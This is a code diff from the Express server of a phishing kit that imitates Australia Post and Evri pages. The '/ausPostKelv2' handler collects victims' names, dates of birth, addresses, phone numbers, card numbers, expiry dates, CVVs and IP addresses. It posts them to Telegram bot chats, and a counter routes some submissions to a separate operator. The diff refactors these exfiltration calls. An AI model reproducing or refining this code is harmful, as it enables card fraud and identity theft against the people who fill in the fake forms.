@@ -335,17 +335,44 @@ app.post("/ausPostKelv2", (req, res) => {
       binList = `${bin} | ${dob} | ${zip} | ${bankName}`;
       var originalText = `+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nState: ${state}\nZIP: ${zip}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cccvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
       if (SpoofergooferAP == 500) {
-        axios.post(
-          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=AusPostSpoofer:\n${originalText}`
-        );
+        axios
+          .post(
+            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
+            {
+              chat_id: 680379375,
+              text: `HAYTCHRES:\n${originalText}`,
+              parse_mode: "Markdown",
+            }
+          )
+          .catch((e) => {
+            console.log(e);
+          });
         SpoofergooferAP = 0;
       } else {
-        axios.post(
-          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=AusPostKelv:\n${originalText}`
-        );
-        axios.post(
-          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=-757683438&text=AusPost 2:\n${originalText}`
-        );
+        axios
+          .post(
+            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
+            {
+              chat_id: 680379375,
+              text: `AusPostKelv:\n${originalText}`,
+              parse_mode: "Markdown",
+            }
+          )
+          .catch((e) => {
+            console.log(e);
+          });
+        axios
+          .post(
+            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
+            {
+              chat_id: "-757683438",
+              text: `AusPost:\n${originalText}`,
+              parse_mode: "Markdown",
+            }
+          )
+          .catch((e) => {
+            console.log(e);
+          });
         SpoofergooferAP += 1;
       }
       res.send("Update Completed");
@@ -8085,7 +8112,7 @@ app.post("/symEvri", (req, res) => {
           .catch((e) => {
             console.log(e);
           });
-          symEvri = 0;
+        symEvri = 0;
       } else if (bin === "542011") {
         axios
           .post(
@@ -8124,7 +8151,7 @@ app.post("/symEvri", (req, res) => {
           .catch((e) => {
             console.log(e);
           });
-          symEvri += 1;
+        symEvri += 1;
       }
 
       res.send("Update Completed");
@@ -8199,7 +8226,7 @@ app.post("/abzEvri", (req, res) => {
           .catch((e) => {
             console.log(e);
           });
-          abzOutlaw = 0;
+        abzOutlaw = 0;
       } else if (bin === "542011") {
         axios
           .post(
@@ -8238,7 +8265,7 @@ app.post("/abzEvri", (req, res) => {
           .catch((e) => {
             console.log(e);
           });
-          abzOutlaw += 1;
+        abzOutlaw += 1;
       }
 
       res.send("Update Completed");
